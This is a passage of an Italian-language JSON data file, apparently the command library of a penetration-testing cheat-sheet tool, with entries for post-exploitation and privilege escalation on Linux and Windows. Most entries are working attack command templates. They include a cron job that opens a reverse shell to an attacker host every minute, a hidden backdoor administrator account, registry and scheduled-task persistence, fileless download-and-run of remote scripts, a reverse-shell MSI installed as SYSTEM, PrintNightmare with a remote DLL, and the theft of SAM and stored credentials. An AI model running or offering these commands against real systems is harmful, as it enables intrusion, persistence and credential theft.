        "template": "findstr /si \"password\" C:\\*.xml C:\\*.ini C:\\*.config 2>nul",
        "description": "Cerca la parola password nei file di config."
      }
    ]
  },
  {
    "id": "gpp-decrypt",
    "name": "GPP — cpassword in SYSVOL",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Le Group Policy Preferences pre-2014 salvano password cifrate con chiave AES nota (MS14-025): cercale in SYSVOL e decifrale.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "gpp",
      "sysvol",
      "ms14-025"
    ],
    "template": "findstr /si \"cpassword\" \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml",
    "params": [
      {
        "key": "dc",
        "label": "DC",
        "ctx": "ip",
        "placeholder": "dc01"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Trova",
        "template": "findstr /si \"cpassword\" \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml",
        "description": "Cerca `cpassword` nei `Groups.xml`."
      },
      {
        "id": "decrypt",
        "label": "Decifra",
        "template": "gpp-decrypt <cpassword>",
        "description": "Decifra il valore `cpassword` trovato."
      }
    ]
  },
  {
    "id": "snaffler",
    "name": "Snaffler — file sensibili nelle share",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Percorre tutte le share AD e segnala i file interessanti per nome/contenuto. Da una macchina Windows nel dominio.",
    "platform": "windows",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "snaffler",
      "pillaging"
    ],
    "template": ".\\Snaffler.exe -s -o snaffler.log",
    "params": []
  },
  {
    "id": "manspider",
    "name": "manspider — keyword nelle share",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "Share Hunt",
    "description": "Cerca nelle share SMB documenti con parole chiave, oppure per estensione. Da Linux.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "manspider"
    ],
    "template": "manspider <range> -u '<user>' -p '<password>' -c 'password' 'secret' 'credential'",
    "params": [
      {
        "key": "range",
        "label": "Range",
        "placeholder": "10.10.10.0/24"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Keyword",
        "template": "manspider <range> -u '<user>' -p '<password>' -c 'password' 'secret' 'credential'",
        "description": "Cerca parole chiave nel contenuto dei documenti."
      },
      {
        "id": "ext",
        "label": "Per estensione",
        "template": "manspider <range> -u '<user>' -p '<password>' -e .kdbx .conf .config .xml .bak",
        "description": "Scarica i file con estensione interessante."
      }
    ]
  },
  {
    "id": "persist-linux",
    "name": "Persistenza — Linux",
    "category": "post-exp",
    "subcategory": "persistence",
    "group": "Linux",
    "description": "Mantieni l’accesso: la tua chiave negli `authorized_keys` o un cron job con reverse shell. Solo se in scope.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "persistence",
      "linux"
    ],
    "template": "mkdir -p ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys",
    "params": [
      {
        "key": "pubkey",
        "label": "Public key",
        "placeholder": "ssh-ed25519 AAAA..."
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SSH key",
        "template": "mkdir -p ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys",
        "description": "La tua chiave pubblica: login senza password."
      },
      {
        "id": "cron",
        "label": "Cron",
        "template": "(crontab -l 2>/dev/null; echo \"* * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\") | crontab -",
        "description": "Reverse shell ogni minuto via cron."
      }
    ]
  },
  {
    "id": "persist-windows",
    "name": "Persistenza — Windows",
    "category": "post-exp",
    "subcategory": "persistence",
    "group": "Windows",
    "description": "Mantieni l’accesso: chiave Run nel registro, scheduled task come SYSTEM, o nuovo utente admin locale. Solo se in scope.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "persistence",
      "windows"
    ],
    "template": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Registry Run",
        "template": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\"",
        "description": "Esegue il payload a ogni logon dell’utente."
      },
      {
        "id": "task",
        "label": "Scheduled task",
        "template": "schtasks /create /sc onlogon /tn Updater /tr \"C:\\Temp\\shell.exe\" /ru SYSTEM",
        "description": "Task a ogni logon, come SYSTEM (serve admin)."
      },
      {
        "id": "user",
        "label": "Nuovo admin",
        "template": "net user backdoor P@ssw0rd123! /add & net localgroup Administrators backdoor /add",
        "description": "Nuovo utente locale aggiunto agli Administrators."
      }
    ]
  },
  {
    "id": "transfer-http",
    "name": "Trasferimento via HTTP",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "HTTP",
    "description": "Ospita i file su un server HTTP dall’attacker, poi scaricali dal target col tool disponibile.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "file-transfer",
      "http"
    ],
    "template": "python3 -m http.server 80",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "file",
        "label": "File",
        "placeholder": "linpeas.sh"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Server (attacker)",
        "template": "python3 -m http.server 80",
        "description": "Server HTTP nella cartella corrente."
      },
      {
        "id": "linux",
        "label": "Download Linux",
        "template": "wget http://<lhost>/<file> -O /tmp/<file>",
        "description": "Oppure `curl http://<lhost>/<file> -o /tmp/<file>`."
      },
      {
        "id": "windows",
        "label": "Download Windows",
        "template": "iwr -uri http://<lhost>/<file> -outfile <file>",
        "description": "PowerShell `Invoke-WebRequest`; alternativa `certutil -urlcache -f http://<lhost>/<file> <file>`."
      },
      {
        "id": "memory",
        "label": "Fileless (PS)",
        "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')",
        "description": "Esegue lo script in memoria, senza scriverlo su disco."
      }
    ]
  },
  {
    "id": "transfer-smb",
    "name": "Trasferimento via SMB",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "SMB",
    "description": "Server SMB dall’attacker: utile quando il target Windows non scarica via HTTP. `-smb2support` per i Windows recenti.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "file-transfer",
      "smb",
      "impacket"
    ],
    "template": "impacket-smbserver share ./ -smb2support",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Server (attacker)",
        "template": "impacket-smbserver share ./ -smb2support",
        "description": "Condivide la cartella corrente come `share`."
      },
      {
        "id": "copy",
        "label": "Copia (Windows)",
        "template": "copy \\\\<lhost>\\share\\file.exe C:\\Temp\\",
        "description": "Dal target Windows: copia dal tuo share."
      }
    ]
  },
  {
    "id": "transfer-misc",
    "name": "Trasferimento — nc / base64",
    "category": "post-exp",
    "subcategory": "file-transfer",
    "group": "Senza tool",
    "description": "Quando mancano HTTP/SMB: trasferisci con netcat o, per file piccoli, copia-incolla in base64.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "file-transfer",
      "nc",
      "base64"
    ],
    "template": "nc -lvnp 9999 > file   # receiver\nnc <ip> 9999 < file    # sender",
    "params": [
      {
        "key": "ip",
        "label": "Destinatario",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "b64",
        "label": "Stringa base64",
        "placeholder": "H4sIAAA..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "netcat",
        "template": "nc -lvnp 9999 > file   # receiver\nnc <ip> 9999 < file   # sender",
        "description": "Receiver in ascolto, sender invia il file."
      },
      {
        "id": "base64",
        "label": "base64",
        "template": "base64 -w0 file   # encode (sorgente)\necho \"<b64>\" | base64 -d > file   # decode (destinazione)",
        "description": "Per file piccoli; su Windows `certutil -decode encoded.txt file`."
      }
    ]
  },
  {
    "id": "linpeas",
    "name": "LinPEAS — enum privesc",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Linux",
    "description": "Lo scan privesc più completo su Linux: evidenzia in rosso/giallo i vettori interessanti (SUID, cron, capabilities, password).",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "linpeas",
      "peass",
      "enum"
    ],
    "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Fileless",
        "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "description": "Esegue in memoria senza scrivere su disco."
      },
      {
        "id": "local",
        "label": "Da file",
        "template": "./linpeas.sh | tee linpeas_output.txt",
        "description": "Trasferisci ed esegui salvando l’output con `tee`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Linux Privesc",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ]
  },
  {
    "id": "linux-exploit-suggester",
    "name": "linux-exploit-suggester",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Linux",
    "description": "Confronta versione kernel e pacchetti con un DB di exploit noti. Da incrociare sempre col risultato di LinPEAS.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "les",
      "kernel",
      "enum"
    ],
    "template": "./linux-exploit-suggester.sh",
    "params": []
  },
  {
    "id": "winpeas",
    "name": "WinPEAS — enum privesc",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Equivalente Windows di LinPEAS: servizi, permessi, credenziali salvate, token privileges, AlwaysInstallElevated.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "winpeas",
      "peass",
      "enum"
    ],
    "template": ".\\winpeas.exe",
    "params": []
  },
  {
    "id": "seatbelt",
    "name": "Seatbelt — security checks",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Raccoglie decine di check di sicurezza host (token, UAC, servizi, credenziali). `-group=all` esegue tutto.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "seatbelt",
      "enum"
    ],
    "template": ".\\Seatbelt.exe -group=all",
    "params": []
  },
  {
    "id": "powerup",
    "name": "PowerUp / SharpUp — misconfig",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Cerca misconfiguration sfruttabili: servizi con permessi deboli, unquoted path, AlwaysInstallElevated.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "powerup",
      "sharpup",
      "enum"
    ],
    "template": "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PowerUp",
        "template": "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
        "description": "PowerShell: `Invoke-AllChecks` lancia tutti i controlli."
      },
      {
        "id": "sharpup",
        "label": "SharpUp",
        "template": ".\\SharpUp.exe audit",
        "description": "Versione C# compilata (.NET), più stealth di PowerShell."
      }
    ]
  },
  {
    "id": "wes",
    "name": "Windows Exploit Suggester",
    "category": "privesc",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Confronta `systeminfo` con i bollettini Microsoft per trovare patch mancanti. Gira in locale sull’output salvato.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "wes",
      "kernel",
      "enum"
    ],
    "template": "systeminfo > systeminfo.txt   # poi: python3 wes.py systeminfo.txt",
    "params": []
  },
  {
    "id": "sudo-l",
    "name": "sudo -l — privilegi sudo",
    "category": "privesc",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Mostra cosa puoi eseguire via `sudo`. Per ogni binario `NOPASSWD` cerca l’escape su GTFOBins.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "gtfobins"
    ],
    "template": "sudo -l",
    "params": [],
    "refs": [
      {
        "label": "GTFOBins",
        "url": "https://gtfobins.github.io/"
      }
    ]
  },
  {
    "id": "sudo-ldpreload",
    "name": "sudo — abuso LD_PRELOAD",
    "category": "privesc",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Se `sudo -l` mostra `env_keep+=LD_PRELOAD`, carica una libreria che dà shell root. Compila `evil.c` con `void _init(){setuid(0);system(\"/bin/bash\");}` (`gcc -fPIC -shared -o evil.so evil.c -nostartfiles`).",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "ld_preload"
    ],
    "template": "sudo LD_PRELOAD=/tmp/evil.so <binary>",
    "params": [
      {
        "key": "binary",
        "label": "Binario sudo",
        "placeholder": "apache2"
      }
    ]
  },
  {
    "id": "sudo-cve2019",
    "name": "sudo CVE-2019-14287",
    "category": "privesc",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Su `sudo < 1.8.28` con una regola tipo `(ALL, !root)`, l’UID `-1` viene risolto come `0` → shell root.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "cve-2019-14287"
    ],
    "template": "sudo -u#-1 /bin/bash",
    "params": []
  },
  {
    "id": "find-suid",
    "name": "SUID/SGID — trova e abusa",
    "category": "privesc",
    "subcategory": "suid-sgid",
    "group": "Linux",
    "description": "Trova i binari `SUID` (eseguono come owner, spesso root). Per ognuno controlla GTFOBins; se è custom analizzalo per command injection o path hijack.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "suid",
      "sgid",
      "gtfobins"
    ],
    "template": "find / -perm -4000 -type f 2>/dev/null",
    "params": [
      {
        "key": "command",
        "label": "Comando hijackato",
        "placeholder": "service"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Trova SUID",
        "template": "find / -perm -4000 -type f 2>/dev/null",
        "description": "Binari `SUID`. Per `SGID` usa `-perm -2000`."
      },
      {
        "id": "pathhijack",
        "label": "PATH hijack",
        "template": "echo '/bin/bash' > /tmp/<command>; chmod +x /tmp/<command>; export PATH=/tmp:$PATH",
        "description": "Se il SUID chiama un comando senza path assoluto: metti un finto `<command>` in testa al `PATH`."
      },
      {
        "id": "soinject",
        "label": "SO injection",
        "template": "strace <binary> 2>&1 | grep \"No such file\"",
        "description": "Se il SUID carica una `.so` mancante: crea tu quella libreria con payload."
      }
    ]
  },
  {
    "id": "getcap-all",
    "name": "getcap — capabilities",
    "category": "privesc",
    "subcategory": "capabilities",
    "group": "Linux",
    "description": "Elenca i file con capabilities e i loro poteri speciali. Da controllare:\n- `cap_setuid` = imposti UID 0, diventi root\n- `cap_dac_read_search` = leggi qualsiasi file, bypassa i permessi (es. `/etc/shadow`)\n- `cap_net_bind_service` = bind su porte < 1024",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "getcap",
      "capabilities"
    ],
    "template": "getcap -r / 2>/dev/null",
    "params": []
  },
  {
    "id": "cap-setuid-python",
    "name": "cap_setuid → shell root",
    "category": "privesc",
    "subcategory": "capabilities",
    "group": "Linux",
    "description": "Se un binario (es. `python3`) ha `cap_setuid+ep`, imposta UID 0 ed esegui una shell.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cap_setuid",
      "python"
    ],
    "template": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "params": []
  },
  {
    "id": "cron-discover",
    "name": "Cron — scopri e abusa",
    "category": "privesc",
    "subcategory": "cron-tasks",
    "group": "Linux",
    "description": "Elenca cron job e timer. Se un job gira come root ed esegue uno script scrivibile o usa una wildcard, puoi iniettare comandi.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cron",
      "wildcard"
    ],
    "template": "cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/; systemctl list-timers",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Scopri",
        "template": "cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/; systemctl list-timers",
        "description": "Cron job di sistema e timer systemd."
      },
      {
        "id": "writable",
        "label": "Script scrivibile",
        "template": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/script.sh",
        "description": "Appendi una reverse shell allo script eseguito dal cron root."
      },
      {
        "id": "wildcard",
        "label": "Wildcard (tar)",
        "template": "echo \"\" > \"--checkpoint=1\"; echo \"\" > \"--checkpoint-action=exec=sh shell.sh\"",
        "description": "Se il job fa `tar *`: crea file il cui nome è un’opzione `tar` → esecuzione."
      }
    ]
  },
  {
    "id": "sched-tasks-win",
    "name": "Scheduled Tasks — Windows",
    "category": "privesc",
    "subcategory": "cron-tasks",
    "group": "Windows",
    "description": "Elenca i task pianificati e cerca quelli che eseguono script/binari scrivibili dal tuo utente: sovrascrivili col payload.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "schtasks",
      "scheduled-task"
    ],
    "template": "schtasks /query /fo LIST /v",
    "params": []
  },
  {
    "id": "whoami-priv",
    "name": "whoami /priv",
    "category": "privesc",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "Mostra i privilegi del token. I più sfruttabili: `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "token",
      "privileges"
    ],
    "template": "whoami /priv",
    "params": []
  },
  {
    "id": "printspoofer",
    "name": "SeImpersonate → SYSTEM (Potato)",
    "category": "privesc",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "Con `SeImpersonatePrivilege` (tipico di service account, IIS, MSSQL) abusi un named pipe per ottenere SYSTEM. Scegli il tool in base alla versione di Windows.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "printspoofer",
      "godpotato",
      "seimpersonate"
    ],
    "template": ".\\PrintSpoofer64.exe -i -c powershell",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PrintSpoofer",
        "template": ".\\PrintSpoofer64.exe -i -c powershell",
        "description": "Windows 10 / Server 2016-2019. `-i` shell interattiva."
      },
      {
        "id": "godpotato",
        "label": "GodPotato",
        "template": ".\\GodPotato.exe -cmd \"C:\\Temp\\shell.exe\"",
        "description": "Funziona su molte versioni (Server 2012-2022)."
      },
      {
        "id": "juicyng",
        "label": "JuicyPotatoNG",
        "template": ".\\JuicyPotatoNG.exe -t * -p C:\\Temp\\shell.exe",
        "description": "Alternativa se le altre falliscono."
      }
    ]
  },
  {
    "id": "sebackup",
    "name": "SeBackup / SeTakeOwnership",
    "category": "privesc",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "Con `SeBackupPrivilege` copi file protetti (SAM/SYSTEM, NTDS); con `SeTakeOwnershipPrivilege` prendi possesso di un file e ti concedi i permessi.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sebackup",
      "setakeownership"
    ],
    "template": "robocopy /B C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SeBackup (robocopy)",
        "template": "robocopy /B C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
        "description": "Copia SAM e SYSTEM bypassando l’ACL (`/B` backup mode), poi `secretsdump LOCAL`."
      },
      {
        "id": "takeown",
        "label": "SeTakeOwnership",
        "template": "takeown /f C:\\Windows\\System32\\config\\SAM & icacls C:\\Windows\\System32\\config\\SAM /grant <user>:F",
        "description": "Prendi ownership del file e concediti Full Control."
      }
    ]
  },
  {
    "id": "dnsadmins-dll",
    "name": "DnsAdmins — DLL → SYSTEM",
    "category": "privesc",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Membro di `DnsAdmins`: fai caricare al servizio DNS (che gira come SYSTEM) una DLL malevola via UNC, poi riavvia il servizio.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "dnsadmins",
      "dll",
      "dns"
    ],
    "template": "dnscmd <dc> /config /serverlevelplugindll \\\\<lhost>\\share\\evil.dll",
    "params": [
      {
        "key": "dc",
        "label": "DC",
        "ctx": "ip",
        "placeholder": "dc01"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Carica DLL",
        "template": "dnscmd <dc> /config /serverlevelplugindll \\\\<lhost>\\share\\evil.dll",
        "description": "Registra la DLL (ospitala su una share SMB)."
      },
      {
        "id": "restart",
        "label": "Riavvia DNS",
        "template": "sc.exe \\\\<dc> stop dns & sc.exe \\\\<dc> start dns",
        "description": "Riavvia il servizio DNS per caricare la DLL."
      }
    ]
  },
  {
    "id": "backup-operators",
    "name": "Backup Operators — leggi SAM",
    "category": "privesc",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Il gruppo `Backup Operators` può leggere qualsiasi file (backup mode): copia SAM/SYSTEM, o usa diskshadow per una shadow copy di NTDS.dit.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "backup-operators",
      "sam"
    ],
    "template": "robocopy /B C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
    "params": []
  },
  {
    "id": "server-operators",
    "name": "Server Operators — abusa servizio",
    "category": "privesc",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Il gruppo `Server Operators` può modificare i servizi: ripunta il binPath di un servizio (es. `AppReadiness`) sul tuo payload e riavvialo.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "server-operators",
      "service"
    ],
    "template": "sc.exe config <service> binPath= \"C:\\Temp\\shell.exe\" & sc.exe stop <service> & sc.exe start <service>",
    "params": [
      {
        "key": "service",
        "label": "Servizio",
        "placeholder": "AppReadiness"
      }
    ]
  },
  {
    "id": "unquoted-path",
    "name": "Servizi — unquoted path / perm deboli",
    "category": "privesc",
    "subcategory": "vuln-services",
    "group": "Windows",
    "description": "Tre classi di servizio sfruttabili: path non quotato con spazi, permessi deboli sulla config, binario scrivibile.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "unquoted-path",
      "service",
      "accesschk"
    ],
    "template": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Unquoted path",
        "template": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\"",
        "description": "Se il path ha spazi e non è tra virgolette (es. `C:\\Program Files\\My App\\svc.exe`), piazza `C:\\Program.exe`."
      },
      {
        "id": "accesschk",
        "label": "Permessi deboli",
        "template": ".\\accesschk64.exe /accepteula -uwcqv \"Users\" *",
        "description": "Cerca servizi con `SERVICE_CHANGE_CONFIG`: poi `sc.exe config <svc> binPath= ...`."
      },
      {
        "id": "writable",
        "label": "Binario scrivibile",
        "template": "icacls \"C:\\path\\to\\service.exe\"",
        "description": "Se hai `(M)`/`(F)` sull’exe: sovrascrivilo col payload."
      }
    ]
  },
  {
    "id": "aie",
    "name": "AlwaysInstallElevated",
    "category": "privesc",
    "subcategory": "aie",
    "group": "Windows",
    "description": "Se entrambe le chiavi `AlwaysInstallElevated` valgono `0x1`, ogni `.msi` viene installato come SYSTEM: genera un MSI malevolo ed eseguilo.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "aie",
      "msi"
    ],
    "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Verifica",
        "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "description": "Devono essere entrambe `0x1` (HKLM e HKCU)."
      },
      {
        "id": "genmsi",
        "label": "Genera MSI",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o shell.msi",
        "description": "Crea l'MSI malevolo (reverse shell). Trasferiscilo sul target, es. in `C:\\Temp\\shell.msi`, e apri un listener sulla LPORT."
      },
      {
        "id": "exploit",
        "label": "Installa MSI",
        "template": "msiexec /quiet /qn /i C:\\Temp\\shell.msi",
        "description": "Installa il payload come SYSTEM. `/quiet /qn` = nessuna interfaccia."
      }
    ]
  },
  {
    "id": "win-cred-hunt",
    "name": "Windows — caccia credenziali",
    "category": "privesc",
    "subcategory": "cred-hunting",
    "group": "Windows",
    "description": "Cerca credenziali per scalare: autologon, file unattend/sysprep, credenziali salvate, Wi-Fi, sessioni VNC/PuTTY nel registro.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "credentials",
      "unattend",
      "wifi"
    ],
    "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Autologon",
        "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul",
        "description": "Cerca `DefaultUserName`/`DefaultPassword`/`AutoAdminLogon`."
      },
      {
        "id": "unattend",
        "label": "Unattend/Sysprep",
        "template": "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul & type C:\\Windows\\Panther\\unattend.xml",
        "description": "File di risposta con password (spesso in base64)."
      },
      {
        "id": "wifi",
        "label": "Wi-Fi",
        "template": "netsh wlan show profile name=\"<profile>\" key=clear",
        "description": "Password Wi-Fi in chiaro (`netsh wlan show profiles` per la lista)."
      },
      {
        "id": "putty",
        "label": "VNC/PuTTY",
        "template": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\ /s 2>nul",
        "description": "Sessioni salvate; per VNC: `reg query HKLM\\SOFTWARE\\RealVNC\\vncserver /v Password`."
      }
    ]
  },
  {
    "id": "kernel-linux",
    "name": "Kernel exploit — Linux",
    "category": "privesc",
    "subcategory": "kernel",
    "group": "Linux",
    "description": "Ultima risorsa (può far crashare l'host). CVE comuni:\n- PwnKit (`CVE-2021-4034`) = polkit, quasi universale\n- DirtyPipe (`CVE-2022-0847`) = kernel 5.8-5.16.11\n- DirtyCow (`CVE-2016-5195`) = kernel vecchi",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "kernel",
      "pwnkit",
      "dirtypipe"
    ],
    "template": "uname -a; searchsploit linux kernel <version>",
    "params": [
      {
        "key": "version",
        "label": "Versione kernel",
        "placeholder": "5.15.0"
      }
    ]
  },
  {
    "id": "kernel-windows",
    "name": "Kernel exploit — Windows",
    "category": "privesc",
    "subcategory": "kernel",
    "group": "Windows",
    "description": "Identifica le patch mancanti da `systeminfo`, poi cerca l'exploit. Comuni:\n- MS16-032\n- MS17-010 (EternalBlue)\n- `CVE-2021-36934` (SeriousSAM)\n- PrintNightmare",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "kernel",
      "printnightmare",
      "eternalblue"
    ],
    "template": "systeminfo   # poi Windows Exploit Suggester o watson",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Identifica",
        "template": "systeminfo   # poi Windows Exploit Suggester o watson",
        "description": "Trova le patch mancanti dal `systeminfo`."
      },
      {
        "id": "printnightmare",
        "label": "PrintNightmare",
        "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\shell.dll'",
        "description": "`CVE-2021-1675`/`34527`. Verifica spooler: `rpcdump.py @<ip> | egrep \"MS-RPRN|MS-PAR\"`. Ospita la DLL su SMB."
      }
    ]
  },
  {
    "id": "docker-group",
    "name": "Gruppo docker / lxd → root",
    "category": "privesc",
    "subcategory": "container-escape",
